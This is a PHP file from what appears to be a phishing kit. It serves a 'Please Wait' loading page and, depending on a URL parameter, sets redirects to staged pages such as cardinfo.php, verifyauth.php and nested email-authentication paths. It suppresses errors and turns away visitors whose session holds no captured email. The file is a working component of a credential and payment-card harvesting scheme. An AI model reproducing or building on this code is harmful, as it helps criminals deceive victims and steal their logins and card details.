<?php
session_start();
ob_start();
error_reporting(0);
$stud = bin2hex('nsnjfj sfjdfjdfj jnjfnjnfj');
$refr = $_GET['ref'];
if($refr == 'DT'){
	$redirect = "Go_off.php";
	}else if ($refr == 'ovr'){
		
$redirect =  "verifyauth.php?$stud";
		}else if ($refr == 'SSO'){
		
$redirect =  "EXTERNAL.API/controls.php?$stud";
		}else if ($refr == 'adc'){
			
		$redirect =  "cardinfo.php?$stud";
			}else if ($refr == 'ASL'){
		$redirect =  "user_type.php?$stud";		
				
				}else if ($refr == 'SEMC'){
		$redirect =  "AC_SL/CD_ED/AC_CD/EM_AUTH/?$stud";		
				
				}else if ($refr == 'CPP'){
		$redirect =  "AC_SL/CD_ED/AC_CD/EM_AUTH/CM_DN/?$stud";		
				
				}else if ($refr == 'WINOS'){
		$redirect =  "AC_SL/AD_ED/AC_CD/EM_AUTH/CM_DN/PC_RM/?$stud";		
				
				}


function loggedin(){
if(isset($_SESSION['email'])&&!empty($_SESSION['email'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	
				
				}else{
		
		die(include 'Go_off.php');
		}



?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Please Wait</title>
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>
<link rel="stylesheet" href="css/style.css" />

</head>


<body>
  <div class="header2-const">
      <div class="header2"></div>
  </div>
  <div class="img8-const">
     <div class="img8a"></div>
  </div>
  <div class="img9-const">
     <div class="img9a"></div>
  </div>
  <div class="img10-const">
     <div class="img10b"><img src="images/wait.gif" alt="" width="150" height="150" /></div>
  </div>
  <div class="footer2-const">
   <div class="footer2"></div>
 </div>
</body>
</html>